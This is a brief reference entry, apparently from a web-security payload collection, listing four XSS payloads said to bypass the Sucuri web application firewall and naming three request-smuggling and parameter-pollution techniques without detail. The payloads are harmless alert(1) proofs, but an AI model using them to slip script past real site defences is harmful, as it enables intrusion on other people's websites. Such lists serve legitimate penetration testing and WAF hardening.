---
id: WAF-BYPASS-006
title: Sucuri WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# Sucuri WAF Bypass Payloads

## XSS Bypasses (4)

1. `<svg onload=alert(1)>` (encoding variation)
2. `<body onload=alert(1)>`
3. `<details open ontoggle=alert(1)>`
4. `<input autofocus onfocus=alert(1)>`

## RCE/Smuggling (3)

1. HTTP request smuggling techniques
2. Parameter pollution for RCE
3. Multipart form boundary manipulation
